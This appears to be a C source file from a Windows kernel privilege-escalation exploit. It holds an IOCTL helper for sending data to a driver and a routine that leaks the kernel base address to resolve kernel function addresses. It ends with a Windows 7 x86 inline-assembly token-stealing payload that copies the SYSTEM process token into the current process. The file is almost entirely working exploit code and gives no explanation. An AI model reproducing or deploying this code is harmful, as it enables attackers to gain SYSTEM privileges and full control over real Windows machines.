#include "Common.h"

BOOLEAN
SendIOCTL(
	_In_ ULONG ulControlCode,
	_In_ PVOID pvSendData,
	_In_ ULONG ulSendDataSize
)
{
	BOOLEAN bRetValue = FALSE;
	HANDLE hDeviceHandle = INVALID_HANDLE_VALUE;
	ULONG ulReturnBytes = 0;

	hDeviceHandle = CreateFile(
		KERNEL_DRIVER_LINK,
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL
		);

	if (INVALID_HANDLE_VALUE == hDeviceHandle)
	{
		goto _RET;
	}

	bRetValue = DeviceIoControl(
		hDeviceHandle,
		ulControlCode,
		pvSendData,
		ulSendDataSize,
		NULL,
		0,
		&ulReturnBytes,
		NULL
	);

_RET:
	if (INVALID_HANDLE_VALUE != hDeviceHandle)
	{
		CloseHandle(hDeviceHandle);
		hDeviceHandle = NULL;
	}

	return bRetValue;
}

PVOID
GetNativeFuncAddress(
	_In_ PCHAR pchNativeFunctionName
)
{
	HMODULE hNtModule = NULL;
	PVOID pvRetNativeFunctionAddress = NULL;
	NTQUERYSYSTEMINFORMATION NtQuerySystemInformation = NULL;
	ULONG ulReturnedLength = 0;
	ULONG ulReturnLength = 0;
	PSYSTEM_MODULE_INFORMATION pSystemInformation = NULL;
	NTSTATUS status = 0;
	PVOID pvKernelBaseAddress = NULL;
	PCHAR pchKernelImage = NULL;
	HMODULE hKernelInUserMode = NULL;

	if (NULL == pchNativeFunctionName)
	{
		goto _RET;
	}

	hNtModule = LoadLibrary(L"ntdll.dll");

	if (NULL == hNtModule)
	{
		goto _RET;
	}

	NtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)GetProcAddress(hNtModule, "NtQuerySystemInformation");

	if (NULL == NtQuerySystemInformation)
	{
		goto _RET;
	}

	NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &ulReturnedLength);

	pSystemInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(
		GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		ulReturnedLength
		);

	if (NULL == pSystemInformation)
	{
		goto _RET;
	}

	status = NtQuerySystemInformation(SystemModuleInformation, pSystemInformation, ulReturnedLength, &ulReturnLength);

	if (status != 0)
	{
		goto _RET;
	}

	pvKernelBaseAddress = pSystemInformation->Modules[0].Base;
	pchKernelImage = strrchr((PCHAR)(pSystemInformation->Modules[0].ImageName), '\\') + 1;

	hKernelInUserMode = LoadLibraryA(pchKernelImage);

	if (NULL == hKernelInUserMode)
	{
		goto _RET;
	}

	pvRetNativeFunctionAddress = (PVOID)GetProcAddress(hKernelInUserMode, pchNativeFunctionName);

	if (NULL == pvRetNativeFunctionAddress)
	{
		goto _RET;
	}

	pvRetNativeFunctionAddress = (PVOID)((ULONG_PTR)pvRetNativeFunctionAddress - (ULONG_PTR)hKernelInUserMode);
	pvRetNativeFunctionAddress = (PVOID)((ULONG_PTR)pvRetNativeFunctionAddress + (ULONG_PTR)pvKernelBaseAddress);

_RET:
	if (NULL != pSystemInformation)
	{
		HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemInformation);
	}

	if (NULL != hNtModule)
	{
		FreeLibrary(hNtModule);
	}

	if (NULL != hKernelInUserMode)
	{
		FreeLibrary(hKernelInUserMode);
	}

	return pvRetNativeFunctionAddress;
}

#ifdef _WIN7_X86_EXPLOIT
#pragma warning(push)
#pragma warning(disable: 4731)

VOID 
TokenStealingPayloadWin7(VOID)
{
	__asm
	{
		pushad
			xor eax, eax
			mov eax, fs:[eax + KTHREAD_OFFSET]
			mov eax, [eax + EPROCESS_OFFSET]
			mov ecx, eax
			mov edx, SYSTEM_PID

		SearchSystemPID :
			mov eax, [eax + FLINK_OFFSET]
			sub eax, FLINK_OFFSET
			cmp[eax + PID_OFFSET], edx
			jne SearchSystemPID

			mov edx, [eax + TOKEN_OFFSET]
			mov[ecx + TOKEN_OFFSET], edx
			popad
	}
}

#pragma warning(pop)
#endif